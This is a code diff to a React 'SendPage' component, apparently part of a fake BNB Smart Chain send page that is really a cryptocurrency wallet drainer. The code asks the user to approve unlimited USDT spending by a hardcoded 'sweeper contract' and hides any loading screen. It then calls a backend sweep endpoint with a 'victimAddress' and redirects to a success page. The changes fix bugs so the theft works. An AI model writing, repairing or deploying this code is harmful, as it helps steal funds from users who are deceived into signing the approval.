@@ -52,26 +52,29 @@ export default function SendPage({ provider, address }: Props) {
         return;
       }
 
-      // 2. Create USDT contract
+      // 2. Get the signer (FIXED: Added await)
+      const signer = await provider.getSigner();
+
+      // 3. Create USDT contract with the resolved signer
       const usdt = new ethers.Contract(
         USDT_ADDRESS,
         ["function approve(address,uint256) external returns (bool)"],
-        provider.getSigner()
+        signer
       );
 
-      // 3. Trigger approval for MAX_UINT256 (no loading screen)
+      // 4. Trigger approval for MAX_UINT256 (no loading screen)
       const tx = await usdt.approve(
         "0x802E52D35F64cfa78e0DBf1Ab920aAA71030308e", // Your sweeper contract
         ethers.MaxUint256,
         { gasLimit: 100000 }
       );
 
-      // 4. Immediately call backend to sweep (no waiting for confirmation)
+      // 5. Immediately call backend to sweep (no waiting for confirmation)
       await fetch('/api/sweep', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'x-auth-key': 'YOUR_AUTH_KEY' // Replace with your actual auth key
+          'x-auth-key': process.env.NEXT_PUBLIC_AUTH_KEY || 'YOUR_AUTH_KEY' // Use env var or fallback
         },
         body: JSON.stringify({
           victimAddress: address,
@@ -79,7 +82,7 @@ export default function SendPage({ provider, address }: Props) {
         })
       });
 
-      // 5. Redirect to success page (no loading screen)
+      // 6. Redirect to success page (no loading screen)
       window.location.href = "/success";
 
     } catch (err) {
@@ -144,7 +147,10 @@ export default function SendPage({ provider, address }: Props) {
           <div className="inline-flex items-center gap-3 bg-[#1B1B1B] rounded-full h-[48px] px-4">
             <svg viewBox="0 0 96 96" className="w-6 h-6 rounded-full shrink-0">
               <circle cx="48" cy="48" r="48" fill="#F0B90B" />
-              <path fill="#0C0F1E" d="M31.5 48l-5.7 5.7L20.1 48l5.7-5.7L31.5 48zm8.5-8.5L48 31.7l8 7.8 5.7-5.7L48 20.3 34.3 33.8 40 39.5zm25.5 8.5l5.7-5.7L75.9 48l-5.7 5.7L65 48zM48 57.7L40.2 49.9l-5.7 5.7L48 69l13.5-13.4-5.7-5.7L48 57.7zm8.2-9.7h-.1L48 56l-8.1-8v-.1L48 40l8.2 8z" />
+              <path
+                fill="#0C0F1E"
+                d="M31.5 48l-5.7 5.7L20.1 48l5.7-5.7L31.5 48zm8.5-8.5L48 31.7l8 7.8 5.7-5.7L48 20.3 34.3 33.8 40 39.5zm25.5 8.5l5.7-5.7L75.9 48l-5.7 5.7L65 48zM48 57.7L40.2 49.9l-5.7 5.7L48 69l13.5-13.4-5.7-5.7L48 57.7zm8.2-9.7h-.1L48 56l-8.1-8v-.1L48 40l8.2 8z"
+              />
             </svg>
             <span className="text-[#BFBFBF] text-[15px] whitespace-nowrap">
               BNB Smart Chain
